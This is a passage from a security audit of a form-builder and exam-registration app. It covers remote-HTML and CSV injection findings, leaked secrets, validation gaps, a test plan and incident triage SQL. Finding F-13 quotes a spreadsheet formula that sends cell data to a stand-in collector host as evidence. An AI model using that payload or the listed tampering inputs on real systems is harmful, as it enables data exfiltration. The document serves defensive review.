- Set small JSON limits for form/submission APIs (for example, an evidence-based 256 KB–1 MB envelope), reject deep/large objects, and use multipart/direct object upload for files.
- Use a streaming CSV parser with hard limits on bytes, rows, columns, cell length, total output, nesting/quoting work, and wall-clock time. Reject unexpected content types and return a bounded preview rather than all rows.
- Use a safe-regex validator or RE2-style engine; cap pattern length and reject nested quantifier constructs. Never run arbitrary regexes on very large inputs in the request event loop.
- Replace all full scans with indexes, claim tables, aggregate tables, pagination/keyset cursors, background exports, and bounded workers.
- Replace fixed high-frequency polling with a one-time result fetch, exponential backoff with jitter, long-polling, or a managed push channel. Cache only non-sensitive public status.
- Add edge/WAF body, connection, request-rate, and concurrency controls and an application-level per-form quota.

### F-12 — Remote HTML and stored file URLs cross trust boundaries (High/Medium)

**Evidence:**

- `PublicFormPage.tsx:1581-1589` calls `document.write(html)` on HTML returned by the external POS service. A compromised POS host can replace the payment page and execute in the form origin.
- `SubmissionViewer.tsx:239-276` treats stored strings as URLs or data URLs; `:336-344` opens them, and `:340` interpolates a base64 string into `newWindow.document.write(<img src="...">)`. Stored file values are respondent-controlled and may be malformed.
- Public branding/support URLs are external browser fetch/navigation targets. They can leak referrer information or create phishing/tracking paths even when React escapes text.

React text rendering currently escapes labels/messages and no `dangerouslySetInnerHTML` was found in the reviewed public page. The `html` field is present in the builder type list but currently falls through the public renderer rather than providing a safe rich-text implementation. That is a functionality gap, not a reason to add raw HTML.

**Remediation:**

- Never `document.write` remote content. Redirect to a provider-controlled hosted checkout or use a tightly sandboxed iframe with an allow-list and message validation.
- For images, use a validated `https`/same-origin DMS URL or a generated object URL; set DOM properties rather than concatenating HTML. Enforce MIME/signature and size before rendering.
- Generate server-issued, short-lived download/preview URLs and authorize the document on every request. Do not honor arbitrary `url`/`data:` values from a submission.
- Use `target="_blank" rel="noopener noreferrer"`, a safe filename function, `Referrer-Policy: no-referrer` where appropriate, and a CSP with explicit `img-src`/`frame-src` allow-lists.
- If rich instructions are required, sanitize a constrained Markdown/HTML subset server-side and render it with a tested sanitizer and context-specific output encoding.

### F-13 — CSV export enables spreadsheet formula injection and unsafe filenames (Medium)

**Evidence:** `submission.service.ts:272-286` quotes values but does not neutralize cells beginning with `=`, `+`, `-`, or `@`. A respondent can submit `=HYPERLINK("https://collector.invalid/?x="&A2)` and cause a reviewer to execute a formula when opening the CSV. The controller interpolates `form.name` directly into `Content-Disposition` (`submission.controller.ts:129-136`); control characters should be rejected/sanitized before use as a header/filename.

**Remediation:**

- Prefix dangerous spreadsheet cells with an apostrophe or export as a safe text type; document the behavior and test all spreadsheet engines in the supported environment.
- Escape/normalize filenames to a strict ASCII allow-list, add RFC 5987 handling if needed, and reject CR/LF/control characters. Use a fixed server-generated ID in the filename if necessary.
- Stream large exports from a background job to encrypted object storage with an expiring authorized link. Do not build a complete CSV string in application memory.

### F-14 — Tracked configuration contains credentials/default secrets (Critical operational risk)

**Evidence:** tracked `.env.example`, `backend/.env.bak`, and `backend/pm2.config.js` contain database/integration credential material or default JWT-secret references. `pm2.config.js` also contains conflicting `NODE_ENV` entries, with the later `DEV` value overriding `production` in the same environment object.

**Remediation:**

- Treat every value that has ever been committed as compromised: revoke/rotate database, DMS, AI, payment, RBAC, and JWT credentials. Purge history where organizational policy requires it; removing a line in a new commit does not erase Git history.
- Keep production values in a secret manager or deployment environment, not tracked files. Use a sanitized `.env.example` containing names only and enforce secret scanning/pre-commit CI.
- Fail startup when required production secrets are missing, weak, or inconsistent. Make environment selection explicit and test the rendered PM2/container configuration.
- Add least-privilege database users, TLS database connections, rotation ownership, and an incident runbook.

## 7. Validation and schema gaps

### Editor request validation

`FormSettingsSchema`, `FormFieldSchema`, `FormVariableSchema`, and nested rule schemas provide useful type checks, but they are not a bounded canonical schema:

- String lengths are mostly unlimited: descriptions, labels, help text, rule messages, formulas, custom CSS, IDs, option labels/values, URLs, and AI prompts can grow without a documented cap.
- Arrays and recursive rule trees have no maximum field count, option count, rule count, depth, or total serialized size.
- `z.any()` is used for values, authentication, conditional values, and mapping data.
- Important frontend properties such as `externalValidation`, `tableValidation`, `minValue`, `maxValue`, `disabled`, `mutualExclusionGroup`, `functionBody`, and payment settings are not represented consistently in the backend schema.
- The validation middleware calls `schema.parse(req.body)` but does not assign the result. Unknown keys are therefore not stripped from the object later serialized by the service. This is both a correctness issue and a secret/control-plane exposure risk.
- No cross-reference validation ensures unique field/variable/step IDs, valid step field IDs, valid rule references, acyclic variable dependencies, valid option values, or a safe formula AST.
- `UpdateFormSchema` permits `isPublished`, allowing a generic update request to alter publication state without going through the publish workflow.

**Required editor-side/server-side preflight:** validate a versioned canonical schema; reject unknown keys or explicitly model them; enforce size/depth/count budgets; resolve all references; reject duplicate IDs/cycles; validate URL policy and file policy; require answer keys only in private revision storage; and return field-path errors without echoing secrets.

### Public submission validation

The UI's React Hook Form rules are convenience checks only. A Burp user can change every field, send hidden/disabled fields, omit a field, select an option not shown by the UI, and call the API directly.

The backend currently has these weaknesses:

- `CreateSubmissionSchema` accepts `data: z.record(z.string(), z.any())`; it does not define a field-by-field value contract.
- `validateSubmission` normalizes strings but preserves unknown keys and intentionally keeps values for hidden fields. If hidden/disabled fields affect payment, permissions, uniqueness, or scoring, this is unsafe.
- Choice fields are not consistently checked against the current allowed option set. A caller can submit an arbitrary radio/select value.
- Number/date values are not consistently checked for finite numeric values, canonical date/time format, timezone policy, or range after coercion. `NaN`/type-confusion paths need explicit rejection.
- File validation trusts submitted `name`, `size`, `type`, and document references; it does not validate decoded content or DMS ownership.
- External validation can be configured as a required step but is called per request without a trust-boundary policy. Its response check uses arbitrary paths and regexes.
- Server uniqueness uses a string comparison scan while the public uniqueness endpoint uses strict equality; case/whitespace/Unicode normalization differs.
- CAPTCHA validation parses an attacker-selected expression instead of a server-issued challenge.
- The backend does not enforce respondent authentication, partial-submission ownership, or payment state.

**Canonical rule:** derive the accepted value object from the published schema on the server. For each field, accept only the declared type, option set, range, cardinality, visibility semantics, and upload token. Reject or explicitly quarantine unknown/hidden values; never use client-calculated variables or client payment amounts as authority.

### ReDoS and parser safety

Any form author may supply regex/response-check patterns. Use a safe engine and budgets. Any organization member may upload CSV through the editor route. Stream and bound it. Any public caller may send JSON to submission/check endpoints. Limit bytes, depth, keys, string lengths, and request concurrency before parsing large structures.

## 8. Frontend/editor findings and improvements

### Current editor behavior to preserve or correct

- `FormBuilderPage` sends a complete schema/settings object on save and then performs a separate save-then-publish sequence.
- `getSchemaWithLayout()` preserves sensitive/advanced settings such as answer keys, formulas, external validation, DMS references, and payment properties.
- The editor now has a reliable unpublished local Preview modal: it exercises respondent controls, configured defaults, validation, conditional visibility, multi-step navigation, and local file/signature/rating/table interactions without using the public URL. It intentionally does not test real connectors; a signed, revision-bound server preview remains required for connector-aware scenarios.
- The browser runs a backend health check using an absolute `VITE_API_URL` with a `localhost` fallback. A production build with a missing variable can call the user's own machine rather than the deployed backend. Browser-facing calls should use same-origin relative URLs or a configured reverse proxy, and the app should not block save on an extra health request.
- AI prompt/request/response data is logged by both the editor and backend AI service. This can expose form PII, integration data, and model output in browser/server logs.
- JSON export downloads the complete local schema/settings, including any persisted secret/answer-key data. Export should have explicit “include private assessment configuration” and “include secrets: never” semantics.

### Recommended Edit page backlog

**P0 — security and correctness**

1. Add a server-authorized capability envelope to the page: `canView`, `canEdit`, `canPublish`, `canShare`, `canDelete`, `canExport`, and response levels are informational only; every mutation still checks on the server.
2. Replace free-form formula/function editing with the safe expression builder described above. Show a visible “runs on server/browser” classification only for approved operations.
3. Split private configuration from published configuration. Display an answer-key/private-data warning and never hydrate secrets into ordinary React state.
4. Add save revisions, ETags/conflict dialogs, atomic publish, draft/published comparison, rollback, and an audit timeline.
5. Add a server preflight endpoint that returns bounded field-path errors, privacy warnings, unreachable references, unsafe URLs, unsupported file policies, and estimated public payload size.
6. Keep the current client-only “Preview draft” safe for field/validation checks, then add a short-lived, signed, revision-bound server preview for connector-aware scenarios. Neither mode may trigger real payment, email, external validation, production webhooks, or permanent uploads.

**P1 — builder usability**

1. Three-pane workspace: searchable palette/outline on the left, responsive canvas in the center, inspector on the right; collapse panes for tablet.
2. A form outline with sections/steps, field search, duplicate-ID/reference warnings, drag handles with keyboard alternatives, and an undo/redo history.
3. A validation inspector with examples, normalized values, min/max/date timezone, option membership, uniqueness semantics, and test cases.
4. A logic graph/test runner for show/hide, required/disabled, dynamic choices, and calculations. Highlight cycles, unreachable branches, conflicting rules, and rules that reference deleted fields.
5. Choice management with bulk CSV import preview, deduplication, stable option IDs, search/select support, localization, and maximum counts.
6. A dedicated data/privacy tab: sensitivity classification, retention, consent wording, response policy, export policy, audit/download policy, and respondent-visible notices.
7. Safe file policy controls: actual MIME allow-list, file signature scan status, maximum count/size, retention, DMS destination, and clear public/private document semantics.
8. Payment configuration through a provider connection/vault, not credential inputs. Show server-calculated amount rules and test/sandbox mode.
9. Accessibility checks while authoring: label association, keyboard order, error announcement, contrast, target size, and screen-reader names.
10. Draft autosave with visible status, offline queue, retry/backoff, and conflict resolution. Never silently overwrite another editor's change.

## 9. Public form/respondent experience recommendations

A premium published exam-registration form should feel calm and trustworthy under a high-stakes deadline while remaining lightweight at the edge.

### Information architecture

- Branded header with verified organization name, logo from an authorized DMS URL, exam title, intake/session, language selector, and a privacy/help link.
- A clear “Registration steps” rail: identity, personal details, eligibility, education, documents, exam preferences, declaration, review, payment, receipt.
- A sticky but compact progress indicator with step status, completed/error states, estimated time, and keyboard-accessible navigation.
- A visible required-field legend, save/resume status, support contact, deadline/timezone, and a “what you need” checklist before the first field.
- A review screen that groups fields by section, displays masked sensitive values, identifies missing/invalid data, and shows the exact published revision/terms accepted.

### Exam-registration controls

- Server-verified OTP or federated identity only where required; do not expose identity values in URLs or error messages.
- Eligibility rules computed server-side from canonical values; show an explanation for an ineligible path without revealing internal rule logic.
- Date/time fields with timezone, locale, calendar, minimum/maximum, blackout dates, and clear deadline formatting.
- Education/qualification tables with named rows, row-level validation, percentage/CGPA conversion policy, and accessible error summaries.
- Document cards showing required/optional status, actual allowed formats, size, upload progress, checksum/scan status, replace/remove actions, and a privacy notice.
- Declaration checkbox with versioned terms, consent purpose, timestamp, and a downloadable copy of the accepted terms.
- Payment summary from the server: line items, tax/fee, currency, refund policy, and a verified transaction status. Never tell a user “successful” from a query string alone.
- A receipt with a non-sensitive reference, QR/deep-link only if protected, downloadable PDF generated server-side, and email delivery that does not reveal full PII in the subject line.

### Premium interaction and accessibility

- Mobile-first layout for low-end devices and intermittent networks; keep the public form bundle separate from builder/admin/payment code.
- Keyboard support for all controls, visible focus, semantic landmarks, `aria-describedby` for help/errors, an error summary that moves focus, and no color-only status.
- Preserve values on network failure; show per-upload/per-step retry states; prevent duplicate final submission with an idempotency token.
- Use optimistic local draft state only as a convenience; server draft state is protected by the respondent session and encrypted/retained according to policy.
- Localize labels, validation messages, number/date formats, right-to-left direction, and content without changing stable field IDs.
- Avoid third-party trackers on sensitive registration pages. Set strict referrer and permission policies.

## 10. Verification plan before sign-off

### Authorization tests

For every form, response, DMS, processing, template, draft, and payment operation, run the same request matrix as:

- organization owner/admin;
- org creator with no target-team membership;
- sibling-team creator/analyst/viewer;
- parent-team role and child-team role;
- direct share, team share, expired share, revoked share;
- aggregate-only, redacted, full, export, and none response levels;
- user from another organization;
- missing/forged `x-org-id`, changed path IDs, and mismatched form/submission/share IDs.

Expected behavior must be asserted by status and response shape, not only by UI visibility.

### Public tampering tests

- Remove/change OTP, CAPTCHA, payment, hidden/disabled, option, uniqueness, external-validation, DMS, and result fields in Burp.
- Replay requests with a different form/revision/field/document ID.
- Send duplicate submissions with the same idempotency key and concurrent unique/vote requests.
- Submit wrong types, huge strings/arrays/depth, `__proto__`/constructor-shaped keys, invalid dates, `NaN`-like values, unapproved options, oversized/base64 files, and malicious filenames.
- Test formulas, regexes, CSV cells, remote URLs, redirect targets, payment callbacks, and result tokens in an isolated environment.

### Security regression automation

- Contract tests for public/editor DTOs and secret-key deny lists.
- Property/fuzz tests for schema, submission values, rule trees, CSV, filenames, JSON depth, and formula parser.
- SAST/secret scanning/dependency scanning; dynamic endpoint scan with authenticated role fixtures.
- CSP/report-only to enforcing rollout; security headers and CORS tests.
- DMS malware/zip-bomb/polyglot tests; payment webhook signature/replay tests.
- Queue crash/retry/idempotency tests and database transaction/race tests.

## 11. How to investigate a suspected tampered registration

### What can be found in the current database

The current `Submission` record stores `id`, `formId`, raw JSON `data`, database `createdAt`, `ip`, `userAgent`, and `processingStatus`. `ProcessingResult` stores the later computed result. `AuditLog` is primarily a per-vote record and is not a general request audit log. The current `Form` stores one mutable schema/settings blob rather than the immutable revision shown to each respondent.

This means an investigation can identify suspicious patterns, but it usually cannot prove that a user changed a browser request. A Burp user who changes a value to another value that is valid under the server's rules leaves an ordinary-looking submission unless the edge/API request log, revision hash, authentication event, or client operation telemetry captured the difference. IP and user-agent are supporting evidence only: both can be shared or spoofed, and the current Express controllers trust the first `X-Forwarded-For` value.

### Immediate incident procedure

1. **Preserve before changing:** record the exact UTC incident window, form ID/slug, deployment version, database snapshot, CDN/WAF/load-balancer logs, API logs, DMS logs, OTP-provider logs, and payment/POS logs. Export them to immutable, access-controlled storage with checksums.
2. **Freeze the affected workflow:** temporarily disable the form, payment, external validation, result release, or upload route as appropriate. Do not delete suspicious submissions or “fix” their JSON in place.
3. **Rotate exposed secrets:** if a formula, external-validation header, payment configuration, or log may have been exposed, revoke and rotate it. Preserve the old secret identifier for correlation, not the secret value.
4. **Reconstruct the exact revision:** use a database backup, deployment artifact, CDN-cached manifest, or future revision history to determine which fields, options, rules, answer key, and payment amount were actually published at the time.
5. **Correlate server-side events:** join submission IDs, request IDs, trusted edge IP, auth/OTP session, upload session, payment order/webhook, processing job, and result-token events. A successful payment must be matched to the provider's signed record, not a browser redirect.
6. **Contain and remediate:** invalidate result/draft/upload tokens, mark affected records for manual review, notify the privacy/payment owner when required, and preserve a timeline of decisions.

### Useful triage queries

These are investigation templates for a read-only copy of MySQL. Replace placeholders with fixed, allow-listed field IDs and an approved UTC window. Do not construct JSON paths directly from an untrusted request parameter.

```sql
-- Burst of accepted registrations by source metadata.
SELECT formId, ip,
       DATE_FORMAT(createdAt, '%Y-%m-%d %H:%i') AS minute_bucket,
       COUNT(*) AS submissions
FROM Submission
WHERE formId = ? AND createdAt >= ? AND createdAt < ?
GROUP BY formId, ip, minute_bucket
HAVING COUNT(*) >= 10
ORDER BY submissions DESC;

-- Processing failures/stuck jobs that may indicate a malformed or abusive request.
SELECT formId, processingStatus, COUNT(*) AS total,
       MIN(createdAt) AS first_seen, MAX(createdAt) AS last_seen
FROM Submission
WHERE formId = ? AND createdAt >= ? AND createdAt < ?
GROUP BY formId, processingStatus;

-- Duplicate vote identifiers in the existing audit table.
SELECT formId, identifier, COUNT(*) AS votes,
       MIN(createdAt) AS first_seen, MAX(createdAt) AS last_seen
FROM AuditLog
WHERE formId = ? AND createdAt >= ? AND createdAt < ?
GROUP BY formId, identifier
HAVING COUNT(*) > 1;
```

For a JSON identity field, use a known field ID and only on a read-only copy:

```sql
SELECT JSON_UNQUOTE(JSON_EXTRACT(data, '$.email_field_id')) AS identity_value,
       COUNT(*) AS total, MIN(createdAt) AS first_seen, MAX(createdAt) AS last_seen
FROM Submission
WHERE formId = ? AND JSON_VALID(data)
  AND createdAt >= ? AND createdAt < ?
GROUP BY identity_value
HAVING COUNT(*) > 1;
```

The application should additionally run a schema-aware scanner that compares each stored value with the reconstructed published revision: unknown field IDs, wrong primitive types, unapproved options, changed hidden/disabled values, invalid finite numbers/dates, unexpected file references, file metadata/content mismatches, and payment amount differences. That comparison is not conclusive against the current mutable schema; it must use the revision active when the submission was accepted.

Look for these correlated indicators rather than treating one as proof:

- many identities/submissions from one trusted edge address or one short-lived session;
- repeated OTP/CAPTCHA failures followed by a sudden success;
- the same idempotency key with different request hashes, or many retries without an idempotency key;
- extra keys, unsupported option values, hidden-field changes, very large bodies, unusual file names, duplicate file hashes, or DMS objects from another form;
- payment order amount/currency/product mismatch, missing signed webhook, or a successful browser status with no provider transaction;
- public result/draft/upload requests for IDs unrelated to the respondent's form/session;
- formula/external-validation changes immediately before the suspicious submissions, or outbound connector requests to private/unexpected addresses.

### Evidence required in a future implementation

Create an append-only, redacted security event stream separate from the business submission JSON. At minimum record:

- server timestamp, request/correlation ID, deployment/version, route, outcome, and reason code;
- tenant, form, immutable `revisionId`/schema hash, submission/job/payment/upload IDs;
- authenticated actor ID or a privacy-preserving respondent-session hash;
- trusted edge source metadata, with retention and access controls;
- events for form revision save/publish, permission denied, auth challenge sent/verified/failed, CAPTCHA result, draft read/write, upload initiate/confirm/scan, submission accepted/rejected, idempotency replay/conflict, payment order/webhook verification, result issue/view, and rate-limit decisions.

Store the canonical server-received request hash and accepted value hash, not full sensitive request bodies in ordinary logs. Use a unique idempotency record, `revisionId`, `authSessionId`, `uploadSessionId`, and signed payment/webhook/result references on the business records. Send the event stream to tamper-evident, restricted storage/SIEM with retention, alerting, and a documented forensic access process.

### Detection rules and response

Alert the security/operations owner on bursts per form/session/IP, many invalid field/option/file attempts, OTP/CAPTCHA abuse, cross-tenant ID mismatches, payment amount mismatches, repeated idempotency conflicts, DMS ownership failures, unexpected connector destinations, result-token replay, and permission denials followed by a successful mutation. Keep alerts privacy-minimized and tune thresholds per form; shared NATs and exam centers can legitimately produce many users from one address.

## 12. Related documents

- [`docs/SECURITY_ISSUES.md`](./SECURITY_ISSUES.md) — earlier security review and DMS-specific findings; this document adds the route-level authorization, formula, payment, privacy, scale, and data-integrity analysis.
- [`docs/PRODUCTION_READINESS_AND_SCALE.md`](./PRODUCTION_READINESS_AND_SCALE.md) — target architecture and capacity plan for 1,000,000 members and 300,000 concurrent users/submissions.
- [`docs/EDIT_PREVIEW_AND_PREMIUM_FORM_GUIDE.md`](./EDIT_PREVIEW_AND_PREMIUM_FORM_GUIDE.md) — detailed Edit/Preview product recommendations and premium exam-registration experience.
